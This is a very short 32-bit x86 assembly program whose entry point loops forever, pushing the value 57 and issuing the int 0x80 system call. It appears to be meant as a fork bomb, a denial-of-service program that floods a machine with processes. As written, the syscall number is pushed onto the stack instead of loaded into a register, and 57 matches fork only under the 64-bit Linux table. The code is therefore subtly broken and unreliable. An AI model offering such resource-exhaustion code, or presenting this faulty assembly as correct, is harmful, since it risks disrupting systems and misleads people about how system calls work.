BITS 32
global _start

section .text

_start:
    push 57
    int 0x80
    jmp _start
